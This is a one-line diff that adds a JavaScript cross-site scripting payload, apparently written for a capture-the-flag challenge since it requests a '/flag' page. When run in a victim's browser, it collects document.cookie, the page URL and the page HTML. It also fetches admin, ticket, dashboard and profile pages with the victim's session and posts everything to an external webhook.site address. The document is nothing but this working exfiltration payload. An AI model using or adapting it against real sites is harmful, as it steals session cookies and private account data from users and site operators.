@@ -1,0 +1,1 @@
+(async()=>{let o={u:location.href,c:document.cookie,b:document.body.innerHTML};for(const p of [`/admin`,`/`,`/tickets`,`/flag`,`/dashboard`,`/admin/tickets`,`/me`]){try{o[p]=(await (await fetch(p)).text()).slice(0,3500)}catch(e){o[p]=String(e)}}fetch(`https://webhook.site/59fe84cd-b809-4104-85d9-03694b6854f5`,{method:`POST`,body:JSON.stringify(o)})})()
